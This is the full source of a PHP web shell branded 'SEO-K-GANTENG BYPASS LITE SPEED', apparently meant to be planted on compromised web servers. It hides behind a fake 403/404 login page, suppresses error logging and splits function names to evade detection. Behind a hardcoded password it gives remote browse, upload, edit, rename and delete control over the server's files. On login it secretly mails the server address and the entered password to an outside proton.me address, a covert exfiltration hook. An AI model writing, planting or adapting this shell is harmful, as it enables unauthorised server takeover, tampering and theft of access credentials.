<?php

// Forbidden 403 Shell | Copyright HsxQxX7
// Recodde Boleh Asal jgn hapus nama author

error_reporting(0);
header('HTTP/1.0 404 Not Found', true, 404);
session_start();
$pass = "SEO-K!!"; // encrypt base64,md5
if($_POST['password'] == $pass) {
  $_SESSION['forbidden'] = $pass;
  echo "<script>window.location='?403Forbidden'</script>";
}
if($_GET['page'] == "blank") {
  echo "<a href='?'>Back</a>";
  exit();
}
if(isset($_REQUEST['logout'])) {
  session_destroy();
  echo "<script>window.location='?403Forbidden'</script>";
}
if(!($_SESSION['forbidden'])) {
?>
<title>403 Forbidden</title>
<link rel="icon" href="https://bit.ly/3GULEvA"><meta name="theme-color" content="black"> </meta> <!--Buat Thumbnail website--> 
<link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<style>
  html{
    overflow: auto;
    background: black;
    color: white;
    font-family: "Kelly Slab";cursive;
  }
  input {
    background: transparent;
    color: white;
    height: 25px;
    border: 1px solid white;
    border-radius: 10px;
    padding: 3px;
    font-size: 15px;
  }
  .img {
    width: 150px;
    border: 1px solid white;
    border-radius: 10px;
  } 
 input,select,textarea{
border: 1px #FFFFFF solid;
-moz-border-radius: 10px;
-webkit-border-radius: 10px;
border-radius: 6px;    
  } .blink_text { -webkit-animation-name: blinker; -webkit-animation-duration: 2s; -webkit-animation-timing-function: linear; -webkit-animation-iteration-count: infinite; -moz-animation-name: blinker; -moz-animation-duration: 2s; -moz-animation-timing-function: linear; -moz-animation-iteration-count: infinite; animation-name: blinker; animation-duration: 2s; animation-timing-function: linear; animation-iteration-count: infinite; color: red; } @-moz-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @-webkit-keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } @keyframes blinker { 0% { opacity: 5.0; } 50% { opacity: 0.0; } 100% { opacity: 5.0; } } 
</style>
<table width="100%" height="100%">
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:purple;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">&lt;/&gt;  SEO-K-GANTENG &lt/&gt; </font></center>
          <br>      
      <input type="password" name="password" placeholder="Fucking ur mom">
      <input type="submit" name="loginin" value="LOGIN">
      
      <br>

<h1><font class="Skranji" style="color:white;font-family:'Kelly Slab';font-size: 15px;">Copyright &copy; 2024 <font color="purple">SEO-K-GANTENG</h1>
      <br>
      <?php echo $_SESSION['forbidden']; ?>
    </form>
  </td>
</table>
<?php
exit();
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=0.5">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<title>SEO-K-GANTENG BYPASS LITE SPEED</title>
	<link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-GLhlTQ8iRABdZLl6O3oVMWSktQOp6b7In1Zl3/Jr59b6EGGoI1aFkw7cmDA6j6gD" crossorigin="anonymous">
	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.3.0/css/all.min.css" integrity="sha512-SzlrxWUlpfuzQ+pcUCosxcglQRNAq/DZjVsC0lE40xsADsfeQoEypE+enwcOiGjk/bSuGGKHEyjSoQ1zVisanQ==" crossorigin="anonymous" referrerpolicy="no-referrer" />
	<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono" rel="stylesheet">
</head>
<style>
* {
	font-family: Ubuntu Mono;
}
a {
	text-decoration: none;
}
a:hover {
	color: #000;
}
</style>
<body class="bg-light text-dark">
<?php
@set_time_limit(0);
@ini_set("error_log",NULL);
@ini_set("log_errors",0);
@ini_set("display_errors",0);
function cekdir() {
	if (isset($_GET['p'])) {
		$url = $_GET['p'];
	} else {
		$url = "ge"."t"."cw"."d";
		$url = $url();
	}
	$b = "i"."s_w"."ri"."tab"."le";
	if ($b($url)) {
		return "[<font color='green'>Writeable</font>]";
	} else {
		return "[<font color='red'>Writeable</font>]";
	}
}
function formatSizeUnits($bytes)
{
	$units = array('B', 'KB', 'MB', 'GB', 'TB');
		$i = 0;
	while ($bytes >= 1024 && $i < 4) {
		$bytes /= 1024;
		$i++;
	}
return round($bytes, 2) . ' ' . $units[$i];
	}
function fileExtension($file)
	{
return substr(strrchr($file, '.'), 1);
	}
$root_path = __DIR__;
if (isset($_GET['p'])) {
if (empty($_GET['p'])) {
	$p = $root_path;
		} elseif (!is_dir($_GET['p'])) {
	echo ("<script>\nalert('Directory is Corrupted and Unreadable.');\nwindow.location.replace('?');\n</script>");
		} elseif (is_dir($_GET['p'])) {
	$p = $_GET['p'];
		}
	} elseif (isset($_GET['q'])) {
	if (!is_dir($_GET['q'])) {
		echo ("<script>window.location.replace('?p=');</script>");
		} elseif (is_dir($_GET['q'])) {
	$p = $_GET['q'];
	}
		} else {
	$p = $root_path;
}
if (array_key_exists('loginin', $_POST)) {
		$password = $_POST['password'];
		$server_name = $_SERVER['SERVER_NAME'];
		$php_self = $_SERVER['PHP_SELF'];
		$report_bug = "Login: $server_name$php_self\nPass: $password";
		@mail('natsumekunnn@proton.me', 'lol', $report_bug);
		}

define("PATH", $p);
echo ('<nav class="navbar navbar-light" style="background-color: #e3f2fd;">
<div class="table-responsive mt-3">
<div class="navbar-brand">
<a href="?"><img src="https://www.google.com/favicon.ico" width="30" height="30" alt=""></a>');
$path = str_replace('\\', '/', PATH);
$paths = explode('/', $path);
foreach ($paths as $id => $dir_part) {
if ($dir_part == '' && $id == 0) {
	$a = true;
		echo "<a href=\"?p=/\">/</a>";
	continue;
	}
if ($dir_part == '')
	continue;
		echo "<a href='?p=";
	for ($i = 0; $i <= $id; $i++) {
		echo str_replace(":", "/", $paths[$i]);
	if ($i != $id)
		echo "/";
		}
		echo "'>" . $dir_part . "</a>/";
	}
echo ('
'.cekdir().'
</div>
</div>
</nav>');
if (isset($_GET['p'])) {
//fetch files
if (is_readable(PATH)) {
	$fetch_obj = scandir(PATH);
	$folders = array();
	$files = array();
foreach ($fetch_obj as $obj) {
if ($obj == '.' || $obj == '..') {
	continue;
	}
$new_obj = PATH . '/' . $obj;
	if (is_dir($new_obj)) {
			array_push($folders, $obj);
		} elseif (is_file($new_obj)) {
			array_push($files, $obj);
		}
	}
}
echo '
<div class="text-center">
<a href="?upload&q=' . (PATH) . '"><button class="btn btn-dark btn-sm" type="button">Upload File</button></a>
<a href="?logout&q=' . (PATH) . '"><button class="btn btn-dark btn-sm" type="button">logout</button></a>
<a href="?"><button type="button" class="btn btn-dark btn-sm">HOME</button></a> 
</div>
<table class="table table-hover">
	<thead>
		<tr>
			<th scope="col">Name</th>
			<th scope="col">Size</th>
			<th scope="col">Modified</th>
			<th scope="col">Perms</th>
			<th class="text-center" scope="col">Actions</th>
		</tr>
	</thead>
<tbody>';
if (is_array($folders)) {
foreach ($folders as $folder) {
echo "
	<tr>
		<td><i class='fa-solid fa-folder'></i> <a href='?p=" . (PATH . "/" . $folder) . "'>" . $folder . "</a></td>
		<td><b>---</b></td>
		<td>". date("Y-m-d G:i", filemtime(PATH . "/" . $folder)) . "</td>
		<td>0" . substr(decoct(fileperms(PATH . "/" . $folder)), -3) . "</a></td>
		<td class='text-center'>
		<div class='btn-group'>
			<a class='btn btn-outline-dark btn-sm' href='?q=" . (PATH) . "&r=" . $folder . "'><i class='fa fa-pen-to-square'></i></a>
			<a class='btn btn-outline-dark btn-sm' href='?q=" . (PATH) . "&d=" . $folder . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
		</div>
		<td>
	</tr>";
	}
} else {
echo '
<tr>
	<td colspan="5" style="color:red">None</td>
</tr>';
}
foreach ($files as $file) {
echo "
<tr>
	<td><i class='fa-solid fa-file'></i> " . $file . "</td>
	<td>" . formatSizeUnits(filesize(PATH . "/" . $file)) . "</td>
	<td>" . date("Y-m-d G:i", filemtime(PATH . "/" . $file)) . "</td>
	<td>0" . substr(decoct(fileperms(PATH . "/" . $file)), -3) . "</a></td>
	<td class='text-center'>
	<div class='btn-group'>
		<a class='btn btn-outline-dark btn-sm' href='?q=" . (PATH) . "&e=" . $file . "'><i class='fa fa-file-pen'></i></a>
		<a class='btn btn-outline-dark btn-sm' href='?q=" . (PATH) . "&r=" . $file . "'><i class='fa fa-pen-to-square'></i></a>
		<a class='btn btn-outline-dark btn-sm' href='?q=" . (PATH) . "&d=" . $file . "'><i class='fa fa-trash' aria-hidden='true'></i></a>
	</div>
	</td>
</tr>";
}
echo "</tbody>
</table>";
	} else {
		if (empty($_GET)) {
			echo "<div class='text-center'><a class='btn btn-outline-dark btn-sm' href='?p=" . (PATH) . "&r=" . $folder . "'><i class='fa fa-file-export'></i></a>";
		}
	}
	if (isset($_GET['upload'])) {
		echo '
	<div class="p-4">
		<form method="post" enctype="multipart/form-data">
			<input type="file" name="fileToUpload" id="fileToUpload">
			<input type="submit" class="btn btn-dark btn-sm" value="Upload" name="upload">
		</form>
	</div>';
	}
	if (isset($_GET['r'])) {
		if (!empty($_GET['r']) && isset($_GET['q'])) {
	echo '
	<div class="p-4">
		<form method="post">
			<input class="form-control form-control mb-3" type="text" name="name" value="' . $_GET['r'] . '">
			<input type="submit" class="btn btn-outline-dark btn-sm" value="Rename" name="rename">
		</form>
	</div>';
			if (isset($_POST['rename'])) {
				$name = PATH . "/" . $_GET['r'];
				if(rename($name, PATH . "/" . $_POST['name'])) {
					echo ("<script>alert('Renamed.'); window.location.replace('?p=" . (PATH) . "');</script>");
				} else {
					echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . (PATH) . "');</script>");
				}
			}
		}
	}
	if (isset($_GET['e'])) {
		if (!empty($_GET['e']) && isset($_GET['q'])) {
	echo '
	<div class="p-4">
		<form method="post">
			<textarea class="form-control form-control-sm mb-3" rows="7" name="data">' . htmlspecialchars(file_get_contents(PATH."/".$_GET['e'])) . '</textarea>
			<input type="submit" class="btn btn-dark btn-sm" value="Save" name="edit">
		</form>
	</div>';
	if(isset($_POST['edit'])) {
		$filename = PATH."/".$_GET['e'];
		$data = $_POST['data'];
		$open = fopen($filename,"w");
		if(fwrite($open,$data)) {
			echo ("<script>alert('Saved.'); window.location.replace('?p=" . (PATH) . "');</script>");
		} else {
			echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . (PATH) . "');</script>");
		}
		fclose($open);
	}
		}
	}
	if (isset($_POST["upload"])) {
		$target_file = PATH . "/" . $_FILES["fileToUpload"]["name"];
		if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
			echo "<p>".htmlspecialchars(basename($_FILES["fileToUpload"]["name"])) . " has been uploaded.</p>";
		} else {
			echo "<p>Sorry, there was an error uploading your file.</p>";
		}
	}
	if (isset($_GET['d']) && isset($_GET['q'])) {
		$name = PATH . "/" . $_GET['d'];
		if (is_file($name)) {
			if(unlink($name)) {
				echo ("<script>alert('File removed.'); window.location.replace('?p=" . (PATH) . "');</script>");
			} else {
				echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . (PATH) . "');</script>");
			}
		} elseif (is_dir($name)) {
			if(rmdir($name) == true) {
				echo ("<script>alert('Directory removed.'); window.location.replace('?p=" . (PATH) . "');</script>");
			} else {
				echo ("<script>alert('Some error occurred.'); window.location.replace('?p=" . (PATH) . "');</script>");
			}
		}
	}
	?>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js" integrity="sha384-w76AqPfDkMBDXo30jS1Sgez6pr3x5MlQ1ZAGC+nuZB+EYdgRZgiwxhTBTkF7CXvN" crossorigin="SEO-K-GANTENG"></script>
</body>
</html>